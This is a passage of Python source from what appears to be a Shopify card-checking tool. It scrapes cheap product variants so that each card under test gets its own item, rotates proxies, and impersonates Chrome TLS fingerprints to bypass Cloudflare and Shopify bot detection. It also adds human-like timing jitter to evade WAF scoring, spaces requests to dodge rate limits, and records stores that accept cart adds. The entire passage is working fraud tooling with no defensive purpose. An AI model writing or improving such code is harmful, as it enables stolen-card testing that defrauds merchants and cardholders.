        u  = quote(cred[:col], safe="") if col >= 0 else quote(cred, safe="")
        pw = quote(cred[col+1:], safe="") if col >= 0 else ""
        return f"http://{u}:{pw}@{hp}"
    parts = s.split(":")
    if len(parts) == 4:
        ip, port, u, pw = parts
        return f"http://{quote(u, safe='')}:{quote(pw, safe='')}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return s


def make_connector():
    """
    Cheap-proxy-safe TCPConnector for aiohttp.
    Used only for GraphQL calls — site-facing requests use curl_cffi instead.
    force_close=True  → no keepalive; cheap proxies drop persistent connections silently.
    enable_cleanup_closed=True → release dead sockets immediately.
    ssl=False → skip cert verify; many residential/cheap proxies break TLS chains.
    """
    return aiohttp.TCPConnector(ssl=False, force_close=True, enable_cleanup_closed=True)


def make_cffi_session(proxy_str=None, profile: dict = None):
    """
    Create a curl_cffi AsyncSession with the given browser profile.
    The profile controls both the TLS fingerprint (impersonate) and the UA.
    If no profile is given, picks a random one.
    Falls back gracefully if curl_cffi is not installed.

    proxy_str — standard proxy URL (http://user:pass@host:port)
    profile   — dict from _BROWSER_PROFILES; if None, pick_browser_profile() is called
    """
    if not _CURL_CFFI_AVAILABLE:
        return None  # caller must fall back to aiohttp

    if profile is None:
        profile = pick_browser_profile()

    impersonate = profile.get("impersonate", _IMPERSONATE_TARGET)

    # Validate impersonate target — fall back to chrome136 if the picked
    # profile's target isn't in this curl_cffi build
    _VALID_TARGETS = {
        "chrome99", "chrome100", "chrome101", "chrome104", "chrome107",
        "chrome110", "chrome116", "chrome119", "chrome120", "chrome123",
        "chrome124", "chrome131", "chrome136",
    }
    if impersonate not in _VALID_TARGETS:
        impersonate = "chrome136"

    kwargs = {
        "impersonate": impersonate,
        "verify":      False,
        "timeout":     20,
    }
    if proxy_str:
        kwargs["proxies"] = {"http": proxy_str, "https": proxy_str}

    return CurlAsyncSession(**kwargs)


def is_captcha_required(text):
    if not text:
        return False
    t = text.upper()
    return any(x in t for x in ["CAPTCHA_REQUIRED", "HCAPTCHA", "H-CAPTCHA", "CAPTCHA CHALLENGE"])


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            part = text.split(start, 1)[1]
            if end in part:
                val = part.split(end, 1)[0]
                return val if val else None
    except Exception:
        pass
    return None


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    if message.lower().startswith("error:"):
        return message[:200]
    message = re.sub(r"<[^>]+>", "", message).strip()

    # Block URL query param strings that aren't real error codes
    URL_PARAM_BLOCKLIST = {
        "skip_shop_pay", "auto_redirect", "edge_redirect", "locale",
        "true", "false", "null", "undefined"
    }
    if message.lower().strip() in URL_PARAM_BLOCKLIST:
        return "UNKNOWN_ERROR"

    for pat in [
        r"(PAYMENTS_[A-Z_]+)", r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z]+)", r"([A-Z]+_[A-Z]+)",
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'\{"code":"([^"]+)"',
    ]:
        for m in re.findall(pat, message, re.IGNORECASE):
            if isinstance(m, tuple):
                m = m[0]
            if m and "_" in m and len(m) < 50:
                clean = m.strip("{}:'\" ")
                if clean.lower() not in URL_PARAM_BLOCKLIST:
                    return clean
    return message[:50]

# ---------------------------------------------------------------------------
# SQLite variant store — replaces simple_variants.json in-memory cache.
# variants.db is queried per-request — zero RAM overhead, no startup spike.
# Schema: variants(site TEXT, variant_id TEXT, price REAL)
#         sites(site TEXT, cheapest_vid TEXT, cheapest_price REAL)
# Run build_variants_db.py once to migrate simple_variants.json → variants.db
# ---------------------------------------------------------------------------
import os as _os
import sqlite3 as _sqlite3
import threading as _threading

_DB_PATH   = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "variants.db")
_DB_LOCK   = _threading.Lock()
_DB_CONN   = None   # per-process shared read-only connection

def _get_db():
    """Return a shared read-only SQLite connection (created on first call)."""
    global _DB_CONN
    if _DB_CONN is None:
        with _DB_LOCK:
            if _DB_CONN is None:
                if not _os.path.exists(_DB_PATH):
                    print("[VCACHE] variants.db not found — run build_variants_db.py to create it")
                    _DB_CONN = None
                    return None
                # uri=True + ?mode=ro opens read-only without write locks
                _DB_CONN = _sqlite3.connect(
                    f"file:{_DB_PATH}?mode=ro", uri=True,
                    check_same_thread=False, timeout=10
                )
                _DB_CONN.row_factory = _sqlite3.Row
                print(f"[VCACHE] Connected to variants.db (read-only)")
    return _DB_CONN

def _normalize_site_key(url: str) -> str:
    """Canonical cache key: strip scheme, trailing slashes/backslashes, lowercase."""
    s = (url or "").strip().strip('"').strip("'").lower()
    # Windows paths / accidental escapes often leave a trailing backslash
    s = s.rstrip("/\\")
    for prefix in ("https://", "http://"):
        if s.startswith(prefix):
            s = s[len(prefix):]
            break
    s = s.rstrip("/\\")
    # drop any path after host
    if "/" in s:
        s = s.split("/", 1)[0]
    if "\\" in s:
        s = s.split("\\", 1)[0]
    return s

def lookup_variant_cache(site_url: str):
    """
    Return a variant dict for the site or None.
    Uses ORDER BY RANDOM() so every card gets a different variant
    from the same site — prevents hammering the same product.
    Falls back to cheapest if only one variant exists.
    Dict format: {"variant_id": "...", "price": "X.XX"}
    """
    db = _get_db()
    if db is None:
        return None
    key = _normalize_site_key(site_url)
    try:
        cur = db.execute(
            "SELECT variant_id, price FROM variants WHERE site=? "
            "AND price >= ? AND price <= ? "
            "ORDER BY RANDOM() LIMIT 1",
            (key, MIN_VARIANT_PRICE, MAX_VARIANT_PRICE)
        )
        row = cur.fetchone()
        if row:
            return {"variant_id": row["variant_id"], "price": f"{row['price']:.2f}"}
    except Exception as e:
        print(f"[VCACHE] lookup error for {key}: {e}")
    return None

def lookup_variant_exclude(site_url: str, exclude_id: str):
    """
    Same as lookup_variant_cache but excludes a specific variant_id.
    Used by _fetch_fresh_variant fallback when a variant fails.
    """
    db = _get_db()
    if db is None:
        return None
    key = _normalize_site_key(site_url)
    try:
        cur = db.execute(
            "SELECT variant_id, price FROM variants WHERE site=? AND variant_id!=? "
            "AND price >= ? AND price <= ? "
            "ORDER BY RANDOM() LIMIT 1",
            (key, str(exclude_id), MIN_VARIANT_PRICE, MAX_VARIANT_PRICE)
        )
        row = cur.fetchone()
        if row:
            return {"variant_id": row["variant_id"], "price": f"{row['price']:.2f}"}
    except Exception as e:
        print(f"[VCACHE] lookup_exclude error for {key}: {e}")
    return None

def get_all_variants_for_site(site_url: str) -> list:
    """
    Return ALL variants in $2–$23 for a site from SQLite, sorted:
      1. Available variants cheapest first
      2. Unavailable variants cheapest first (last resort)
    Returns list of dicts: [{"variant_id": "...", "price": "X.XX"}, ...]
    """
    db = _get_db()
    if db is None:
        return []
    key = _normalize_site_key(site_url)
    try:
        cur = db.execute(
            "SELECT variant_id, price FROM variants WHERE site=? "
            "AND price >= ? AND price <= ? "
            "ORDER BY price ASC",
            (key, MIN_VARIANT_PRICE, MAX_VARIANT_PRICE)
        )
        rows = cur.fetchall()
        if not rows:
            return []
        # Shuffle so concurrent cards on the same site don't all start with variant[0]
        import random
        result = [{"variant_id": r["variant_id"], "price": f"{r['price']:.2f}"}
                  for r in rows
                  if MIN_VARIANT_PRICE <= r["price"] <= MAX_VARIANT_PRICE]
        random.shuffle(result)
        return result
    except Exception as e:
        print(f"[VCACHE] get_all_variants error for {key}: {e}")
    return []

def count_sites_in_db() -> int:
    db = _get_db()
    if db is None:
        return 0
    try:
        cur = db.execute("SELECT COUNT(*) FROM sites")
        return cur.fetchone()[0]
    except Exception:
        return 0

# Log DB status at startup (non-blocking)
def _log_db_status():
    n = count_sites_in_db()
    if n:
        print(f"[VCACHE] variants.db ready — {n} sites available")
    else:
        print("[VCACHE] variants.db empty or missing — using fetch_products fallback")

import threading as _t
_t.Thread(target=_log_db_status, daemon=True).start()

# ---------------------------------------------------------------------------
# Local variant cache — persists between runs so products.json is only
# fetched ONCE per site. Stored next to the script as variant_cache.json.
# ---------------------------------------------------------------------------
_LOCAL_CACHE_PATH = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "variant_cache.json")
_local_cache_lock = _threading.Lock()

def _load_local_cache() -> dict:
    try:
        with open(_LOCAL_CACHE_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def _save_local_cache(cache: dict):
    try:
        tmp = _LOCAL_CACHE_PATH + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(cache, f, indent=2)
        _os.replace(tmp, _LOCAL_CACHE_PATH)
    except Exception as e:
        print(f"[LOCAL-CACHE] save error: {e}")

def local_cache_get(site_url: str) -> dict | None:
    key = _normalize_site_key(site_url)
    with _local_cache_lock:
        entry = _load_local_cache().get(key)
    # Hard price window — reject stale cache entries outside the window
    if entry:
        try:
            _p = float(str(entry.get("price", "0")).replace(",", ""))
        except (ValueError, TypeError):
            _p = 0.0
        if _p < MIN_VARIANT_PRICE or _p > MAX_VARIANT_PRICE:
            print(f"[LOCAL-CACHE] {key} cached price {entry.get('price')} outside window — ignoring")
            return None
    return entry

def local_cache_set(site_url: str, variant_id: str, price: str):
    key = _normalize_site_key(site_url)
    # Hard price window — never persist out-of-window variants
    try:
        _p = float(str(price).replace(",", ""))
    except (ValueError, TypeError):
        _p = 0.0
    if _p < MIN_VARIANT_PRICE or _p > MAX_VARIANT_PRICE:
        print(f"[LOCAL-CACHE] refusing to save {key} price={price} (outside ${MIN_VARIANT_PRICE:.2f}-${MAX_VARIANT_PRICE:.2f})")
        return
    with _local_cache_lock:
        cache = _load_local_cache()
        cache[key] = {"variant_id": variant_id, "price": price}
        _save_local_cache(cache)
    print(f"[LOCAL-CACHE] saved {key} → variant={variant_id} price={price}")

# ---------------------------------------------------------------------------
# Good Sites Tracker — saves confirmed-working site+variant pairs to JSON
# ---------------------------------------------------------------------------
# A "good response" = cart returned 200/201 on the first attempt.
# Saved to logs/good_sites.json as:
#   { "https://site.myshopify.com": {"variant_id": "...", "price": "X.XX",
#                                    "hits": N, "last_seen": "2026-..."},
#     ...
#   }
# Thread-safe: protected by _good_sites_lock.
# Flushed to disk every GOOD_SITES_FLUSH_EVERY saves (not on every call).
# ---------------------------------------------------------------------------
import time as _time

_GOOD_SITES_PATH        = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "logs", "good_sites.json")
_good_sites_lock        = _threading.Lock()
_good_sites: dict       = {}
_good_sites_dirty       = 0          # unsaved write count
GOOD_SITES_FLUSH_EVERY  = 10         # flush to disk every N saves

def _load_good_sites():
    """Load existing good_sites.json into memory on startup."""
    global _good_sites
    try:
        _os.makedirs(_os.path.dirname(_GOOD_SITES_PATH), exist_ok=True)
        if _os.path.exists(_GOOD_SITES_PATH):
            with open(_GOOD_SITES_PATH, "r", encoding="utf-8") as f:
                _good_sites = json.load(f)
            print(f"[GOOD-SITES] loaded {len(_good_sites)} entries from good_sites.json")
    except Exception as e:
        print(f"[GOOD-SITES] load error: {e}")
        _good_sites = {}

def _flush_good_sites():
    """Write in-memory good_sites to disk (called under lock)."""
    try:
        _os.makedirs(_os.path.dirname(_GOOD_SITES_PATH), exist_ok=True)
        tmp = _GOOD_SITES_PATH + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(_good_sites, f, indent=2)
        _os.replace(tmp, _GOOD_SITES_PATH)
    except Exception as e:
        print(f"[GOOD-SITES] flush error: {e}")

def save_good_site(site_url: str, variant_id: str, price: str):
    """
    Record a confirmed-good site+variant (cart returned 200/201).
    Thread-safe. Flushes to disk every GOOD_SITES_FLUSH_EVERY calls.
    """
    global _good_sites_dirty
    import datetime as _dt
    key = site_url.strip().rstrip("/")
    now = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with _good_sites_lock:
        entry = _good_sites.get(key)
        if entry:
            entry["hits"]      = entry.get("hits", 1) + 1
            entry["last_seen"] = now
            # Update variant if a newer one is confirmed
            entry["variant_id"] = variant_id
            entry["price"]      = price
        else:
            _good_sites[key] = {
                "variant_id": variant_id,
                "price":      price,
                "hits":       1,
                "first_seen": now,
                "last_seen":  now,
            }
        _good_sites_dirty += 1
        should_flush = (_good_sites_dirty % GOOD_SITES_FLUSH_EVERY == 0)

    if should_flush:
        with _good_sites_lock:
            _flush_good_sites()
        print(f"[GOOD-SITES] flushed {len(_good_sites)} entries to good_sites.json")

# Load on startup
_threading.Thread(target=_load_good_sites, daemon=True).start()


# ---------------------------------------------------------------------------
# Updated Patched Fetch_Products Issues Lawda Syntax-Ok
# ---------------------------------------------------------------------------
async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain
        parsed = urlparse(domain)
        host = parsed.netloc or parsed.path
        if not host or "." not in host or " " in host:
            return False, "Site Error! Status: 0"

        proxy = parse_proxy(proxy_str) if proxy_str else None

        # HAR-exact headers for /products.json — browser treats this as a navigation,
        # NOT an XHR. Wrong headers = Cloudflare/Shopify bot detection.
        hdrs = {
            "User-Agent":                UA,
            "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding":           "gzip, deflate, br, zstd",
            "Accept-Language":           "en-GB,en-US;q=0.9,en;q=0.8",
            "Cache-Control":             "max-age=0",
            "priority":                  "u=0, i",
            "sec-ch-ua":                 SEC_CH_UA,
            "sec-ch-ua-mobile":          "?0",
            "sec-ch-ua-platform":        '"Windows"',
            "sec-fetch-dest":            "document",
            "sec-fetch-mode":            "navigate",
            "sec-fetch-site":            "none",
            "sec-fetch-user":            "?1",
            "upgrade-insecure-requests": "1",
        }
        HARD_DEAD = (401, 402, 403, 404, 410, 423, 451)
        SOFT_DEAD  = (429, 500, 502, 503, 530)

        # US country names that appear in Shopify location-based option3 variants
        US_COUNTRY_HINTS = {"united states", "us", "usa", "u.s.", "u.s.a."}

        def _is_us_variant(v):
            for key in ("option1", "option2", "option3"):
                val = (v.get(key) or "").lower().strip()
                if val in US_COUNTRY_HINTS:
                    return True
            return False

        def _pick_best_variant(products):
            best_us    = (float("inf"), None)
            best_avail = (float("inf"), None)
            best_any   = (float("inf"), None)
            for p in products:
                handle = p.get("handle", "")
                for v in p.get("variants", []):
                    try:
                        price = float(str(v.get("price", "0")).replace(",", ""))
                    except (ValueError, TypeError):
                        continue
                    if price <= 0:
                        continue
                    # Hard price window — never select expensive or penny products
                    if price < MIN_VARIANT_PRICE or price > MAX_VARIANT_PRICE:
                        continue
                    candidate = {
                        "site":           domain,
                        "price":          f"{price:.2f}",
                        "variant_id":     str(v["id"]),
                        "product_handle": handle,
                        "link":           f"{domain}/products/{handle}",
                    }
                    available = v.get("available", True)
                    is_us     = _is_us_variant(v)
                    if available and is_us and price < best_us[0]:
                        best_us = (price, candidate)
                    if available and price < best_avail[0]:
                        best_avail = (price, candidate)
                    if price < best_any[0]:
                        best_any = (price, candidate)
            return (best_us[1] or best_avail[1] or best_any[1])

        # ── curl_cffi session — Chrome TLS fingerprint ───────────────────────
        # Shopify and Cloudflare check JA3/JA4 on /products.json requests.
        # Using curl_cffi with impersonate="chrome136" bypasses the fingerprint
        # check entirely. Falls back to aiohttp if curl_cffi is not installed.
        cffi_sess = make_cffi_session(proxy_str)

        async def _cffi_get(url, headers=None, allow_redirects=True):
            """GET via curl_cffi session, returns (status, text)."""
            resp = await cffi_sess.get(
                url,
                headers=headers,
                allow_redirects=allow_redirects,
                timeout=3,
            )
            return resp.status_code, resp.text

        async def _aio_get_fallback(url, hdrs_):
            """aiohttp fallback GET when curl_cffi is unavailable."""
            aio_timeout = aiohttp.ClientTimeout(total=20)
            async with aiohttp.ClientSession(
                connector=make_connector(), timeout=aio_timeout
            ) as s:
                async with s.get(
                    url, headers=hdrs_, proxy=proxy, allow_redirects=True
                ) as r:
                    return r.status, await r.text()

        async def smart_get(url, extra_hdrs=None):
            """Use curl_cffi if available, otherwise aiohttp."""
            h = {**hdrs, **(extra_hdrs or {})}
            if cffi_sess is not None:
                try:
                    return await _cffi_get(url, headers=h)
                except Exception as e:
                    print(f"[fetch_products] curl_cffi error on {url}: {e} — falling back to aiohttp")
            return await _aio_get_fallback(url, h)

        try:
            # ── PRIMARY: /products.json?limit=5 ─────────────────────────────
            primary_failed = False
            try:
                status, text = await smart_get(f"{domain}/products.json?limit=5")
                if status in HARD_DEAD:
                    return False, f"Site Error! Status: {status}"
                if status in SOFT_DEAD:
                    primary_failed = True
                elif status == 200:
                    try:
                        data = json.loads(text)
                    except json.JSONDecodeError:
                        data = {}
                    products = data.get("products", [])
                    if products:
                        result = _pick_best_variant(products)
                        if result:
                            return result
                        primary_failed = True
                    elif '"handle"' not in text and '"variants"' not in text:
                        return False, "Not Shopify"
                    else:
                        primary_failed = True
                else:
                    primary_failed = True
            except Exception as e:
                err_s = str(e).lower()
                if "proxy" in err_s or "cannot connect" in err_s:
                    return False, f"Cannot connect to proxy: {e}"
                if "connect" in err_s or "timeout" in err_s or "timed out" in err_s:
                    return False, "Site Error! Status: 0"
                print(f"[fetch_products] limit=5 error: {type(e).__name__}: {e}")
                primary_failed = True

            # ── FALLBACK 1: /products.json?limit=25 ─────────────────────────
            try:
                status, text = await smart_get(f"{domain}/products.json?limit=25")
                if status == 200:
                    result = _pick_best_variant(json.loads(text).get("products", []))
                    if result:
                        return result
            except Exception as e:
                print(f"[fetch_products] limit=25 error: {type(e).__name__}: {e}")

            # ── FALLBACK 2: /collections/all/products.json?limit=5 ──────────
            try:
                status, text = await smart_get(f"{domain}/collections/all/products.json?limit=5")
                if status == 200:
                    result = _pick_best_variant(json.loads(text).get("products", []))
                    if result:
                        return result
            except Exception:
                pass

            # ── FALLBACK 3: HTML scrape /collections/all ────────────────────
            try:
                html_extra = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
                status, html = await smart_get(f"{domain}/collections/all", extra_hdrs=html_extra)
                if status == 200:
                    vm = re.findall(r'"id"\s*:\s*(\d{11,14})', html)
                    pm = re.findall(r'"price"\s*:\s*"?(\d{2,8})"?', html)
                    if vm and pm:
                        raw   = float(pm[0])
                        price = raw / 100.0 if raw > 999 else raw
                        if MIN_VARIANT_PRICE <= price <= MAX_VARIANT_PRICE:
                            return {"site": domain, "price": f"{price:.2f}",
                                    "variant_id": vm[0], "product_handle": "", "link": domain}
                    hm = re.search(r"/products/([\w-]+)\?variant=(\d+)", html)
                    if hm:
                        handle, vid = hm.group(1), hm.group(2)
                        pm2 = re.search(r'"price"\s*:\s*"?(\d+)"?', html)
                        raw   = float(pm2.group(1)) if pm2 else 100
                        price = raw / 100.0 if raw > 999 else raw
                        if MIN_VARIANT_PRICE <= price <= MAX_VARIANT_PRICE:
                            return {"site": domain, "price": f"{price:.2f}",
                                    "variant_id": vid, "product_handle": handle,
                                    "link": f"{domain}/products/{handle}"}
            except Exception:
                pass

            # ── FALLBACK 4: Homepage → first /products/ href → .json ────────
            try:
                html_extra = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
                status, html = await smart_get(domain, extra_hdrs=html_extra)
                if status == 200:
                    pm = re.search(r'href="(/products/([\w-]+))"', html)
                    if pm:
                        prod_path, handle = pm.group(1), pm.group(2)
                        status2, ptext = await smart_get(f"{domain}{prod_path}.json")
                        if status2 == 200:
                            pdata  = json.loads(ptext)
                            result = _pick_best_variant([pdata.get("product", {})])
                            if result:
                                return result
            except Exception:
                pass

        finally:
            # Close curl_cffi session
            if cffi_sess is not None:
                try:
                    await cffi_sess.close()
                except Exception:
                    pass

        # ── FINAL FALLBACK: plain requests (sync, no TLS fingerprinting needed) ──
        # One single request at limit=250 — avoids hammering the same endpoint
        # multiple times and triggering rate limits.
        try:
            import requests as _req
            import urllib3 as _urllib3
            _urllib3.disable_warnings(_urllib3.exceptions.InsecureRequestWarning)
            _simple_hdrs = {
                "User-Agent": UA,
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
            }
            _req_proxies = None
            if proxy_str:
                _p = parse_proxy(proxy_str)
                if _p:
                    _req_proxies = {"http": _p, "https": _p}
            try:
                _r = _req.get(
                    f"{domain}/products.json?limit=250",
                    headers=_simple_hdrs,
                    timeout=15,
                    allow_redirects=True,
                    verify=False,
                    proxies=_req_proxies,
                )
                if _r.status_code == 200:
                    _products = _r.json().get("products", [])
                    _result = _pick_best_variant(_products)
                    if _result:
                        print(f"[fetch_products] FINAL FALLBACK succeeded")
                        return _result
                else:
                    print(f"[fetch_products] FINAL FALLBACK status={_r.status_code}")
            except Exception as _fe:
                print(f"[fetch_products] final fallback error: {_fe}")
        except ImportError:
            pass

        return False, "No Products"
    except Exception as e:
        return False, f"error: {e}"

# ---------------------------------------------------------------------------
# make_graphql_request — proxy-Chod ne vala Step
# ---------------------------------------------------------------------------
async def make_graphql_request(session, graphql_url, params, headers, json_data, proxy, tag=""):
    """
    Retries once on connection-reset errors (common with cheap proxies that
    drop the first request on a new connection).
    Also detects HTML challenge pages (Cloudflare bot block) and retries once.
    """
    for attempt in range(2):
        try:
            response     = await session.post(graphql_url, params=params, headers=headers,
                                              json=json_data, proxy=proxy)
            response_text = await response.text()
            if tag:
                print(f"{tag} GraphQL status={response.status}")

            # HTML response = Cloudflare/WAF intercepted the call — retry once
            stripped = response_text.strip()
            if (stripped.startswith("<!DOCTYPE html>") or stripped.startswith("<html") or
                    response.status in (429, 430, 502, 503)):
                if attempt == 0:
                    await asyncio.sleep(1.0)
                    continue
                # second attempt still HTML — surface as error
                return None, "Change Proxy"

            return response, response_text
        except (aiohttp.ServerDisconnectedError, aiohttp.ClientOSError,
                ConnectionResetError) as e:
            if attempt == 0:
                await asyncio.sleep(0.5)
                continue
            return None, str(e)
        except Exception as e:
            return None, str(e)
    return None, "max retries"

# ---------------------------------------------------------------------------
# Criticle Proxy Fucker Graphql
# ---------------------------------------------------------------------------
async def _fetch_fresh_variant(site_url: str, proxy_str=None, exclude_id: str = None) -> str | None:
    """
    Get a fresh variant for a site, excluding exclude_id.
    1. Try SQLite DB first (instant, no network)
    2. Fall back to /products.json fetch if DB has no alternative
    """
    # ── Try DB first ────────────────────────────────────────────────────────
    if exclude_id:
        cached = lookup_variant_exclude(site_url, exclude_id)
    else:
        cached = lookup_variant_cache(site_url)
    if cached and cached.get("variant_id") and cached["variant_id"] != exclude_id:
        return cached["variant_id"]

    # ── Fall back to live /products.json fetch ───────────────────────────────
    try:
        domain = site_url if site_url.startswith("http") else f"https://{site_url}"
        proxy  = parse_proxy(proxy_str) if proxy_str else None
        hdrs   = {
            "User-Agent":    UA,
            "Accept":        "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
        }
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(
            connector=make_connector(), timeout=timeout
        ) as session:
            for limit in (25, 100):
                try:
                    async with session.get(
                        f"{domain}/products.json?limit={limit}",
                        headers=hdrs, proxy=proxy, allow_redirects=True
                    ) as resp:
                        if resp.status != 200:
                            continue
                        data = json.loads(await resp.text())
                        candidates = []
                        for p in data.get("products", []):
                            for v in p.get("variants", []):
                                try:
                                    price = float(str(v.get("price", "0")).replace(",", ""))
                                except (ValueError, TypeError):
                                    continue
                                if price <= 0:
                                    continue
                                # Hard price window — skip expensive/penny variants
                                if price < MIN_VARIANT_PRICE or price > MAX_VARIANT_PRICE:
                                    continue
                                vid = str(v["id"])
                                if vid == exclude_id:
                                    continue
                                avail = v.get("available", True)
                                candidates.append((price, avail, vid))
                        if not candidates:
                            continue
                        # prefer available, then cheapest
                        candidates.sort(key=lambda x: (not x[1], x[0]))
                        return candidates[0][2]
                except Exception:
                    continue
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Per-site AND per-proxy 429 cooldown tracker (process-level, shared across threads)
#
# Two-level tracking:
#   1. Site-level  — if site consistently 429s regardless of proxy, cool the site
#   2. Proxy-level — if proxy keeps getting 429 across multiple sites, cool the proxy
#
# Cooldowns are short (3s) — just enough for the rate-limit window to reset
# without holding up other cards. The goal is to avoid hammering the same
# site/proxy combo that is already rejecting us.
# ---------------------------------------------------------------------------
import time as _time

_site_429_lock    = _threading.Lock()
_site_429_until   = {}   # site_key  → float (epoch when cooldown expires)
_proxy_429_until  = {}   # proxy_key → float (epoch when cooldown expires)
SITE_429_COOLDOWN  = 3   # seconds to back off a 429-ing site
PROXY_429_COOLDOWN = 5   # seconds to back off a 429-ing proxy (slightly longer)

# Per-site 429 hit counter — extend cooldown if site gets hammered repeatedly
_site_429_hits    = {}   # site_key → int (hit count in current window)
_site_429_hits_ts = {}   # site_key → float (window start epoch)
SITE_429_HIT_WINDOW  = 60   # seconds
SITE_429_HIT_MAX     = 5    # after this many hits in the window, extend site cooldown

# ---------------------------------------------------------------------------
# Per-site-per-proxy minimum gap enforcer
#
# Root cause of most 429s: the same proxy IP hits the same store multiple times
# in quick succession. Shopify rate-limits at IP+store level.
# Fix: track the last cart-add time per (site, proxy) pair. Enforce a minimum
# gap (SITE_PROXY_GAP_S) between attempts from the same IP to the same store.
# This spreads requests naturally without adding a global sleep.
# ---------------------------------------------------------------------------
_sp_gap_lock = _threading.Lock()
_sp_last_hit = {}  # (site_key, proxy_key) → float (epoch of last attempt)
SITE_PROXY_GAP_S = 8  # minimum seconds between same proxy hitting same site


def _can_attempt(site_key: str, proxy_str: str) -> tuple:
    """
    Returns (allowed: bool, wait_s: float).
    If not allowed, wait_s is how many seconds to wait before retrying.
    """
    pk  = _proxy_key(proxy_str or "")
    key = (site_key, pk)
    now = _time.time()
    with _sp_gap_lock:
        last = _sp_last_hit.get(key, 0)
        gap  = now - last
        if gap < SITE_PROXY_GAP_S:
            return False, SITE_PROXY_GAP_S - gap
        return True, 0.0


def _record_attempt(site_key: str, proxy_str: str):
    """Mark a cart attempt for this (site, proxy) pair."""
    pk  = _proxy_key(proxy_str or "")
    key = (site_key, pk)
    with _sp_gap_lock:
        _sp_last_hit[key] = _time.time()


# Periodic cleanup — prevent unbounded growth during long sessions
def _start_sp_cleanup():
    def _cleanup():
        while True:
            _time.sleep(120)
            cutoff = _time.time() - 300  # drop entries older than 5 min
            with _sp_gap_lock:
                stale = [k for k, v in _sp_last_hit.items() if v < cutoff]
                for k in stale:
                    del _sp_last_hit[k]
    _threading.Thread(target=_cleanup, daemon=True).start()

_start_sp_cleanup()


def _proxy_key(proxy_str: str) -> str:
    """Canonical key for a proxy URL — strips credentials, keeps host:port."""
    if not proxy_str:
        return "DIRECT"
    try:
        p = urlparse(proxy_str)
        return f"{p.hostname}:{p.port}"
    except Exception:
        return proxy_str[:50]


def _is_site_cooling(site_key: str) -> bool:
    with _site_429_lock:
        return _time.time() < _site_429_until.get(site_key, 0)


def _is_proxy_cooling(proxy_str: str) -> bool:
    pk = _proxy_key(proxy_str)
    with _site_429_lock:
        return _time.time() < _proxy_429_until.get(pk, 0)


def _set_site_cooldown(site_key: str, proxy_str: str = None):
    """
    Set 3s cooldown on the site.
    If the same site has been 429ing repeatedly (SITE_429_HIT_MAX times in
    SITE_429_HIT_WINDOW seconds), extend to 10s and also cool the proxy.
    """
    now = _time.time()
    with _site_429_lock:
        # Track hit count in rolling window
        win_start = _site_429_hits_ts.get(site_key, 0)
        if now - win_start > SITE_429_HIT_WINDOW:
            _site_429_hits[site_key]    = 1
            _site_429_hits_ts[site_key] = now
        else:
            _site_429_hits[site_key] = _site_429_hits.get(site_key, 0) + 1

        hits = _site_429_hits[site_key]
        if hits >= SITE_429_HIT_MAX:
            # Site is aggressively rate-limiting — extend cooldown
            cooldown = 10
            _site_429_hits[site_key] = 0  # reset counter
        else:
            cooldown = SITE_429_COOLDOWN

        _site_429_until[site_key] = now + cooldown

        # Also cool the proxy that triggered this 429
        if proxy_str:
            pk = _proxy_key(proxy_str)
            _proxy_429_until[pk] = now + PROXY_429_COOLDOWN

    print(f"[429-COOLDOWN] site={site_key} cooldown={cooldown}s hits={hits}"
          f"{(' proxy=' + _proxy_key(proxy_str)) if proxy_str else ''}")


# ---------------------------------------------------------------------------
# Behavioral timing jitter — human-like micro-delays between requests
#
# Real browsers don't fire requests at exact millisecond intervals.
# Sending requests with zero gap between them is a strong bot signal.
# These delays are in the 80–350ms range — imperceptible to throughput but
# effective at reducing WAF bot-score.
# ---------------------------------------------------------------------------

async def _human_jitter(min_ms: int = 80, max_ms: int = 350):
    """Async sleep for a random human-like delay in milliseconds."""
    await asyncio.sleep(random.uniform(min_ms / 1000.0, max_ms / 1000.0))


# ---------------------------------------------------------------------------
# validate_site — PRE-CHECK before any card action
#
# 1. Fetches the site homepage to confirm it is alive and is a real Shopify store.
# 2. Parses product variants from /products.json (already cached in DB).
#    If variants are found in DB, skip live fetch entirely (fast path).
# 3. Returns (ok, reason, variant_id, price):
#    ok=True  → site alive, variant_id and price populated
#    ok=False → site dead, reason is the error code to return to Go
#
# Dead-site reasons returned to Go (checker.go already handles these):
#   "Not Shopify"                   → dead site, rotate
#   "Site requires login!"          → dead site, rotate
#   "Payment method not available"  → dead site, rotate
#   "No Products"                   → dead site, rotate
#   "Site Error! Status: NNN"       → dead site (4xx) or transient (5xx)
#   "Cannot connect to proxy: ..."  → dead proxy, rotate proxy
# ---------------------------------------------------------------------------
async def validate_site(site_url: str, proxy_str=None) -> tuple:
    """
    Pre-validate a Shopify site before touching any card.
    Returns (ok: bool, reason: str, variant_id: str, price: str)
    """
    ourl  = site_url if site_url.startswith("http") else f"https://{site_url}"
    key   = _normalize_site_key(ourl)
    proxy = parse_proxy(proxy_str) if proxy_str else None

    # ── Fast path: site already in variants.db ───────────────────────────────
    # If we have variants cached, we know the site was alive when scraped.
    # Do a lightweight HEAD/GET to confirm it's still up, then return immediately.
